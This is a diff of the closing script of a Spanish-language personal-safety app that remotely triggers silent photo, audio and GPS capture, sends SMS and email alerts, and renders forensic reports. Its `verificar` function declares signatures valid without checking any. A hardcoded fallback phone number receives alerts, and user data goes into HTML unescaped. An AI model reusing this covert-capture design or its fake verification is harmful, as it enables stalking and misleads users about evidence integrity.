+            alert('🚨 ORDEN REMOTA EJECUTADA CON ÉXITO.\nEn cuanto el delincuente abra la aplicación en el celular robado, el sistema detonará en silencio capturando fotos, audio y GPS.');
+            return;
+        }
+    }
+
+    try {
+        const sub = await buscarSuscripcionPorLlave(l);
+        if (!sub) return alert('LLAVE CRIPTOGRÁFICA NO ENCONTRADA EN LA BÓVEDA C4.');
+
+        await authTrucha(sub.imei);
+        restaurarDatosRecuperacion(sub);
+
+        if (accion === 'restaurar') {
+            localStorage.setItem('imei', sub.imei);
+            localStorage.setItem('llave_maestra', LK(sub.llave_acceso));
+            if (sub.fecha_vencimiento) localStorage.setItem('fecha_vencimiento', sub.fecha_vencimiento);
+            localStorage.setItem('ok', '1');
+            document.getElementById('pI').value = sub.imei;
+            if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = sub.imei;
+
+            if (sub.datos_acta) {
+                try {
+                    const actaNube = JSON.parse(sub.datos_acta);
+                    if (actaNube && actaNube.id) {
+                        const idxExistente = listaActas.findIndex(x => x.id === actaNube.id);
+                        if (idxExistente >= 0) listaActas[idxExistente] = actaNube;
+                        else listaActas.push(actaNube);
+                        await guardarActas();
+                    }
+                } catch(eActa) {}
+            }
+
+            activarBotonesSeguridad();
+            await verificarSuscripcion();
+            await solicitarTodosLosPermisos();
+            alert('✅ Llave Criptográfica verificada con éxito.\nTu cuenta, contactos y Botón S.O.S. se restauraron en este celular.');
+            window.ir('inicio');
+        } else if (accion === 'detonar') {
+            if(confirm('¿Activar protocolo S.O.S. a distancia para cazar al teléfono robado?')) {
+                const filtroDet = sub.id ? ('id=eq.' + sub.id) : ('imei=eq.' + sub.imei);
+                await supaQuery('PATCH', 'c4_suscripciones?' + filtroDet, { alarma_remota: true });
+                alert('🚨 ORDEN REMOTA EJECUTADA CON ÉXITO.\nEn cuanto el delincuente abra la aplicación en el celular robado, el sistema detonará en silencio capturando fotos, audio y GPS.');
+            }
+        }
+    } catch(e) { 
+        debugLog('Error recuperar: ' + e.message);
+        alert('Error al conectar con la bóveda C4. Verificá tu conexión.'); 
+    }
+}
+
+setInterval(async () => {
+    const imei = localStorage.getItem('imei');
+    const k = localStorage.getItem('llave_maestra');
+    if ((imei || k) && localStorage.getItem('ok') === '1' && !window.sosActivo) {
+        try {
+            await asegurarSesionSupabase();
+            const filtro = k ? ('llave_acceso=eq.' + LK(k)) : ('imei=eq.' + imei);
+            const res = await supaQuery('GET', 'c4_suscripciones?select=alarma_remota&' + filtro);
+            if (res && res.length > 0 && res[0].alarma_remota === true) {
+                debugLog('ALARMA REMOTA C4 RECIBIDA');
+                window.ir('sos');
+                disparoSOS('remoto'); 
+            }
+        } catch(e) {}
+    }
+}, 3000); 
+
+function formatSMS(num) {
+    let c = String(num).replace(/\D/g, '');
+    if (c.startsWith('549')) c = c.substring(3);
+    else if (c.startsWith('54')) c = c.substring(2);
+    if (c.startsWith('0')) c = c.substring(1);
+    c = c.replace(/^(11|2\d{2}|3\d{2})15(\d+)$/, '$1$2'); 
+    return c;
+}
+
+function enviarSMSOculto(contactos, nombre, la, ln, id, tipo) {
+    if (!contactos || !Array.isArray(contactos) || contactos.length === 0) {
+        try {
+            const imeiActual = localStorage.getItem('imei');
+            let raw = localStorage.getItem('contactos') || localStorage.getItem('contactos_' + imeiActual) || '[]';
+            contactos = JSON.parse(raw);
+        } catch(e) { contactos = []; }
+    }
+    if (!contactos || contactos.length === 0) {
+        debugLog('❌ ERROR: No hay contactos. Usando base.');
+        const miWa = localStorage.getItem('mi_wa');
+        contactos = miWa ? [miWa] : ['3816092676'];
+    }
+    
+    let msg = "";
+    if (tipo === 'alerta_gps') {
+        msg = "ALERTA SOS - C4: " + (nombre || 'Usuaria') + " en peligro. Exp: " + id + " - Mapa: https://maps.google.com/?q=" + la + "," + ln;
+    } else if (tipo === 'alerta_sin_gps') {
+        msg = "ALERTA SOS - C4: " + (nombre || 'Usuaria') + " en peligro. Exp: " + id + " (Senal bloqueada)";
+    } else {
+        return; 
+    }
+    
+    let contactosLimpios = contactos.map(c => formatSMS(c));
+    
+    debugLog('Despachando 1 SOLO SMS COMBINADO vía Vercel...');
+    
+    fetch('/api/enviar-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ contactos: contactosLimpios, mensaje: msg })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if(data.success) debugLog('✅ SMS enviado al servidor');
+        else debugLog('❌ Falla en el servidor de SMS');
+    })
+    .catch(err => debugLog('❌ Error SMS: ' + err.message));
+}
+
+function enviarEmailOculto(email, nombre, la, ln, id, tipo) {
+    if (!email || email.trim() === '') {
+        debugLog('❌ ERROR: No hay Email configurado en la memoria (Registrá de nuevo).');
+        return;
+    }
+    let asunto = "", msg = "";
+    const imeiEnvio = localStorage.getItem('imei') || 'SIN_IMEI';
+    
+    if (tipo === 'alerta') { 
+        asunto = '🚨 ALERTA S.O.S C4 - ' + nombre; 
+        msg = "ALERTA DE EMERGENCIA C4\n\nNuestra empresa de protección informa que la usuaria " + (nombre || 'protegida') + " ha disparado la alerta S.O.S.\nEl dispositivo se encuentra en modo recolección forense (capturando audio, foto y GPS de manera silenciosa para confeccionar el acta pericial).\n\nExpediente: " + id + "\nIMEI / ID: " + imeiEnvio + "\n\nEnergy 2026 - Ni Una Menos está resguardando toda la evidencia en sus servidores privados criptográficos listos para la fiscalía.";
+    } else if (tipo === 'gps') { 
+        asunto = '📍 GPS RASTREO C4 - ' + nombre; 
+        msg = "El sistema C4 ha capturado un punto de ubicación en el rastreo en vivo de " + (nombre || 'la usuaria') + ".\n\nUbicación satelital:\nhttps://maps.google.com/?q=" + la + "," + ln; 
+    } else if (tipo === 'seguro') { 
+        asunto = '✅ SISTEMA C4 DESACTIVADO - ' + nombre; 
+        msg = "ALERTA C4 CANCELADA\n\nInformamos que " + (nombre || 'la usuaria') + " ha verificado su identidad mediante llave maestra y ha desactivado el sistema de protección de manera segura.\nNuestra empresa ha cerrado y encriptado la evidencia recolectada en un acta pericial.\n\nProtección Corporativa - Energy 2026 - Ni Una Menos."; 
+    } else if (tipo === 'bienvenida') {
+        asunto = 'Bienvenida a Energy 2026 - Tu Llave Maestra'; 
+        msg = "Bienvenida al sistema de protección judicial C4.\n\nTu Llave Maestra única e intransferible es: " + id + "\n\nGuardá este correo. Te servirá para desactivar la alarma en caso de emergencia, frenar el temporizador o recuperar tu cuenta.\n\nProtección Corporativa - Energy 2026.";
+    }
+    
+    debugLog('Despachando Email corporativo a: ' + email);
+    fetch('https://ni-una-menos-arg.vercel.app/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: email, asunto: asunto, msg: msg })
+    })
+    .then(res => {
+        if(res.ok) debugLog('✅ Email enviado correctamente.');
+        else debugLog('❌ Falló el envío del Email.');
+    })
+    .catch(err => debugLog('❌ Error crítico en el servidor de Email: ' + err.message));
+}
+
+function render(a){
+    const c = document.getElementById('alertas');
+    let d = document.getElementById('a_'+a.id);
+    if (!d) {
+        d = document.createElement('div');
+        d.className = 'acta';
+        d.id = 'a_'+a.id;
+        c.prepend(d);
+        if(mapas[a.id]) { mapas[a.id].remove(); delete mapas[a.id]; }
+        d.innerHTML = '<div style="position:absolute;top:12px;right:12px;width:70px;height:70px;border-radius:50%;border:2px solid #5A3E00;background:linear-gradient(145deg,#fff,#E6C76B);display:grid;place-items:center;font-family:Cinzel;font-weight:900;font-size:9px;text-align:center;transform:rotate(-6deg);box-shadow:var(--luzRelieve);z-index:4">NI<br>UNA<br>MENOS</div>' +
+        '<div class="noimp" style="position:absolute;top:12px;left:12px;z-index:4"><button onclick="borrarActa(\'' + a.id + '\')" style="width:36px;height:36px;border-radius:6px;border:none;background:#B00020;color:#fff;font-family:Cinzel;font-weight:bold;font-size:18px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,0.3);">X</button></div>' +
+        '<div style="text-align:center;padding-bottom:12px;border-bottom:3px double #000;margin-bottom:12px;position:relative;z-index:3">' +
+        '<h2 style="font-family:Cinzel;font-weight:900;letter-spacing:4px;font-size:18px">INFORME TECNICO PERICIAL P4</h2>' +
+        '<div class="nroExpediente">EXPEDIENTE N° ' + a.numero_acta + '</div>' +
+        '<div style="font-family:JetBrains Mono,monospace;font-size:13px;color:#8B0000;margin-top:6px;font-weight:800;">FECHA: ' + a.fecha + ' | HORA: ' + a.hora + '</div></div>' +
+        '<h3>I - IDENTIFICACION</h3>' +
+        '<table class="t"><tr><th>NOMBRE</th><td>' + a.nombre + '</td><th>IMEI</th><td class="mono" style="background:transparent;border:none">' + a.imei + '</td></tr></table>' +
+        '<h3>II - HUELLA FORENSE</h3>' +
+        '<table class="t"><tr><th>NAVEGADOR / S.O.</th><td colspan="3" style="font-size:10px">' + (a.userAgent||'—') + '</td></tr>' +
+        '<tr><th>RED</th><td id="red_' + a.id + '">' + (a.red||'—') + '</td><th>BATERIA</th><td id="bat_' + a.id + '">' + (a.bateria||'—') + '</td></tr></table>' +
+        '<h3>III - GEOLOCALIZACION</h3>' +
+        '<table class="t"><tr><th>WGS84 ACTUAL</th><td id="coords_' + a.id + '" colspan="3">' + (a.lat||'—') + ' , ' + (a.lng||'—') + '</td></tr>' +
+        '<tr><th>PRECISION</th><td id="prec_' + a.id + '" colspan="3">' + (a.precision||'—') + 'm</td></tr></table>' +
+        '<div class="mapa" id="m_' + a.id + '"></div><div id="maplink_' + a.id + '"></div>' +
+        '<h3>IV - EVIDENCIA FOTOGRAFICA OCULTA</h3><div class="galeria" id="gal_img_' + a.id + '" data-len="0"></div>' +
+        '<h3>V - EVIDENCIA EN VIDEO</h3><div class="galeria" id="gal_vid_' + a.id + '" data-len="0"></div>' +
+        '<h3>VI - EVIDENCIA DE AUDIO (MICROFONO)</h3><div class="galeria" id="gal_aud_' + a.id + '" data-len="0"></div>' +
+        '<h3>VII - FIRMAS CRIPTOGRAFICAS</h3><div class="mono">ID: ' + a.id + '<br>SHA-256: <span id="sha_' + a.id + '">' + a.sha256 + '</span></div>' +
+        '<div class="firmas"><div>FIRMA TITULAR</div><div>NI UNA MENOS<br>EMPRESA ENERGY</div><div>FIRMA PERITO</div></div>';
+        
+        setTimeout(()=>{
+            if(!document.getElementById('m_'+a.id) || mapas[a.id] || a.lat === 'Buscando...' || a.lat === 'Desconocida') return;
+            try {
+                const mm = L.map('m_'+a.id,{zoomControl:false,attributionControl:false}).setView([a.lat||-26.8241,a.lng||-65.2226],16);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(mm);
+                if (a.ruta && a.ruta.length > 1) L.polyline(a.ruta, { color: '#8B0000', weight: 5, opacity: 0.8, className: 'ruta-animada' }).addTo(mm);
+                L.marker([a.lat||-26.8241,a.lng||-65.2226]).addTo(mm);
+                mapas[a.id] = mm;
+            } catch(e){}
+        }, 400);
+    } else {
+        const elCoords = document.getElementById('coords_' + a.id);
+        if(elCoords) elCoords.innerText = (a.lat||'—') + ' , ' + (a.lng||'—');
+        const elPrec = document.getElementById('prec_' + a.id);
+        if(elPrec) elPrec.innerText = (a.precision||'—') + 'm';
+        const elRed = document.getElementById('red_' + a.id);
+        if(elRed) elRed.innerText = a.red||'—';
+        const elBat = document.getElementById('bat_' + a.id);
+        if(elBat) elBat.innerText = a.bateria||'—';
+        const elSha = document.getElementById('sha_' + a.id);
+        if(elSha) elSha.innerText = a.sha256;
+        if (a.lat !== 'Buscando...' && a.lat !== 'Desconocida' && mapas[a.id]) {
+            mapas[a.id].setView([a.lat, a.lng]);
+            mapas[a.id].eachLayer((layer) => {
+                if (layer instanceof L.Marker || layer instanceof L.Polyline) mapas[a.id].removeLayer(layer);
+            });
+            if (a.ruta && a.ruta.length > 1) L.polyline(a.ruta, { color: '#8B0000', weight: 5, opacity: 0.8, className: 'ruta-animada' }).addTo(mapas[a.id]);
+            L.marker([a.lat, a.lng]).addTo(mapas[a.id]);
+        }
+    }
+    
+    if (a.lat !== 'Buscando...' && a.lat !== 'Desconocida') {
+        const mapLink = document.getElementById('maplink_' + a.id);
+        if(mapLink) mapLink.innerHTML = '<a href="https://maps.google.com/?q=' + a.lat + ',' + a.lng + '" target="_blank" style="display:block;background:var(--oro);color:#fff;text-align:center;padding:15px;border-radius:8px;font-weight:900;font-family:Cinzel,serif;text-decoration:none;margin-top:15px;margin-bottom:15px;box-shadow:0 4px 10px rgba(0,0,0,0.3);font-size:16px;">ABRIR UBICACION EN GOOGLE MAPS</a>';
+    }
+    
+    const fT = a.imagenes && a.imagenes.length ? a.imagenes.map((i, idx) => 
+        '<div class="foto" style="padding:10px;width:100%;"><span style="color:#8B0000;font-weight:800;font-size:12px;margin-bottom:8px;">CAMARA ' + (i.camara || 'desconocida').toUpperCase() + ' (RECONOCIMIENTO)</span><img src="' + i.url + '" style="width:100%;height:auto;border-radius:8px;" onerror="this.src=\'\'"><button type="button" class="btn-descarga-evidencia noimp" onclick="forzarDescargaArchivo(\'' + i.url + '\', \'FOTO_' + a.id + '_' + (idx+1) + '.jpg\')">⬇️ DESCARGAR FOTO ' + (idx+1) + '</button></div>'
+    ).join('') : '';
+    
+    const vV = a.videos && a.videos.length ? a.videos.map((vid,i) => {
+        let url = ''; let cam = 'TRASERA';
+        if (vid && vid.url) { url = vid.url; cam = vid.camara || 'TRASERA'; }
+        else if (vid && vid.blob instanceof Blob) { url = URL.createObjectURL(vid.blob); cam = vid.camara || 'TRASERA'; }
+        else if (vid && vid.rutaNativa) { url = vid.rutaNativa; cam = vid.camara || 'TRASERA'; }
+        else if (vid instanceof Blob) { url = URL.createObjectURL(vid); }
+        const ext = (url && url.includes('.mp4')) || (url && url.includes('video/mp4')) ? 'mp4' : 'webm';
+        return '<div class="foto" style="padding:10px;width:100%;"><span style="color:#8B0000;font-weight:800;font-size:12px;margin-bottom:8px;">VIDEO ' + (i+1) + ' (' + cam + ')</span><video controls playsinline preload="auto" src="' + url + '" style="width:100%;border-radius:8px;background:#000;"></video><button type="button" class="btn-descarga-evidencia noimp" onclick="forzarDescargaArchivo(\'' + url + '\', \'VIDEO_' + a.id + '_' + (i+1) + '.' + ext + '\')">⬇️ DESCARGAR VIDEO ' + (i+1) + '</button></div>';
+    }).join('') : '';
+    
+    const aA = a.audios && a.audios.length ? a.audios.map((aud,i) => {
+        let url = '';
+        if (aud && aud.url) url = aud.url;
+        else if (aud && aud.blob instanceof Blob) url = URL.createObjectURL(aud.blob);
+        else if (aud && aud.rutaNativa) url = aud.rutaNativa;
+        else if (aud instanceof Blob) url = URL.createObjectURL(aud);
+        return '<div style="background:#FAFAFA;border:1px solid #EEE;padding:15px;border-radius:8px;margin-bottom:10px;text-align:center;"><p style="font-size:12px;font-weight:800;color:#8B0000;margin-bottom:8px;">AUDIO DE ENTORNO ' + (i+1) + '</p><audio controls preload="auto" src="' + url + '" style="width:100%;"></audio><button type="button" class="btn-descarga-evidencia noimp" onclick="forzarDescargaArchivo(\'' + url + '\', \'AUDIO_' + a.id + '_' + (i+1) + '.webm\')">⬇️ DESCARGAR AUDIO ' + (i+1) + '</button></div>';
+    }).join('') : '';
+    
+    let imgContainer = document.getElementById('gal_img_' + a.id);
+    let vidContainer = document.getElementById('gal_vid_' + a.id);
+    let audContainer = document.getElementById('gal_aud_' + a.id);
+    if (imgContainer && imgContainer.dataset.len != (a.imagenes ? a.imagenes.length : 0)) { imgContainer.innerHTML = fT; imgContainer.dataset.len = a.imagenes ? a.imagenes.length : 0; }
+    if (vidContainer && vidContainer.dataset.len != (a.videos ? a.videos.length : 0)) { vidContainer.innerHTML = vV; vidContainer.dataset.len = a.videos ? a.videos.length : 0; }
+    if (audContainer && audContainer.dataset.len != (a.audios ? a.audios.length : 0)) { audContainer.innerHTML = aA; audContainer.dataset.len = a.audios ? a.audios.length : 0; }
+}
+
+const verificar = async () =>{ alert('VERIFICACION CORPORATIVA\\nTodas las firmas locales válidas y blindadas.\\nLeyes: 26.485 - 25.326'); };
+
+function iniciarKeepAlive() {
+    debugLog('Iniciando keep-alive PWA...');
+    setInterval(() => {
+        if (localStorage.getItem('ok') === '1') {
+            if (!audioKeepAlive) {
+                try {
+                    audioKeepAlive = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+                    audioKeepAlive.loop = true;
+                    audioKeepAlive.setAttribute('playsinline', '');
+                    audioKeepAlive.volume = 0.01;
+                    audioKeepAlive.play().catch(e => {});
+                } catch(e){}
+            }
+        }
+    }, 30000);
+    
+    setInterval(() => {
+        if (navigator.geolocation && localStorage.getItem('ok') === '1') {
+            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 5000, maximumAge: 0 });
+        }
+    }, 60000);
+    debugLog('Keep-alive activo');
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+    debugLog('=== SISTEMA C4 PWA INICIADO ===');
+    await iniciarApp();
+});
+
+async function iniciarApp() {
+    await cargarActasLocales(); 
+    const savedImei = localStorage.getItem('imei');
+    if(savedImei) {
+        document.getElementById('pI').value = savedImei;
+        if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = savedImei;
+    }
+    if(localStorage.getItem('ok') === '1') {
+        const activo = await verificarSuscripcion();
+        if (activo) {
+            activarBotonesSeguridad();
+            checkCentinelaOnInit(); 
+        }
+    }
+    iniciarKeepAlive();
+    window.ir('inicio');
+    debugLog('Operaciones corporativas en línea');
+}
+</script>
+</body>
+</html>
